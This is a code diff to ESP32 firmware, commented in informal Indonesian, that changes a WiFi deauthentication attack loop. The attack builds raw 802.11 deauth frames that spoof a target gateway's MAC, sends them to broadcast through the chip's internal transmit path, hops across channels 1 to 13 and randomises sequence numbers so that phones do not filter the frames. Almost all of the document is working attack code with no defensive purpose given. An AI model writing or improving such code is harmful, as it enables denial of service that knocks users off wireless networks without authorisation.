@@ -123,51 +123,44 @@ void loopWiFi(void * pvParameters) {
 
     // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
     // Pindahin ke luar biar mandiri Cok!
-    if (isDeauthing && adaTarget) {
+        if (isDeauthing && adaTarget) {
       if (!deauthUdahSetup) {
         esp_wifi_stop();
-        esp_wifi_set_mode(WIFI_MODE_STA); 
+        esp_wifi_set_mode(WIFI_MODE_AP); 
         esp_wifi_start();
         esp_wifi_set_promiscuous(true);
-        esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
         deauthUdahSetup = true;
-        delayMicroseconds(1000);
       }
 
       uint8_t gatewayMAC[6];
       stringToMac(targetTerkunci.mac, gatewayMAC); 
       uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
-      // Paket Deauth Standar (26 byte)
-      uint8_t pkt[26] = {
-          0xc0, 0x00, 0x3a, 0x01,
-          0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest
-          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src (Nanti diisi)
-          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
-          0x00, 0x00,                         // Seq
-          0x07, 0x00                          // Reason
-      };
-      memcpy(&pkt[10], gatewayMAC, 6);
+      // Paket Deauth
+      uint8_t pkt[26] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
+      
+      memcpy(&pkt[10], gatewayMAC, 6); 
       memcpy(&pkt[16], gatewayMAC, 6);
 
-      static uint16_t seq_counter = 0; // Taruh luar biar naik terus
-
-      for (int i = 0; i < 60; i++) {
-        // Update Sequence Number secara manual & bertahap
-        seq_counter += 0x10; // Naik 1 tiap frame (4 bit bawah itu fragment)
-        if (seq_counter > 0xFFF0) seq_counter = 0;
+      // --- AGGRESSIVE INTERNAL HOPPING ---
+      for (int ch = 1; ch <= 13; ch++) {
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
         
-        pkt[22] = seq_counter & 0xFF;
-        pkt[23] = (seq_counter >> 8) & 0xFF;
+        for (int i = 0; i < 40; i++) { // Tambah jumlah peluru
+          // Update Sequence Number pake cara yang lebih "acak" biar gak difilter HP
+          uint16_t seq = (uint16_t)(esp_random() & 0xFFF); 
+          pkt[22] = (seq << 4) & 0xFF;
+          pkt[23] = (seq >> 4) & 0xFF;
 
-        // Tembak pake jalur rahasia
-        esp_wifi_internal_tx(WIFI_IF_STA, pkt, 26); 
-        
-        // Kasih jeda dikit biar router gak 'kebanjiran' terus drop paket
-        delayMicroseconds(500); 
+          // PAKE JALUR INTERNAL BIAR GAK ERROR UNSUPPORTED
+          esp_wifi_internal_tx(WIFI_IF_STA, pkt, 26); 
+        }
+        delayMicroseconds(300); // Jeda antar channel
+        yield(); // Biar gak reboot
       }
-      vTaskDelay(1 / portTICK_PERIOD_MS);
+      vTaskDelay(10 / portTICK_PERIOD_MS);
     }
+
 
 
 
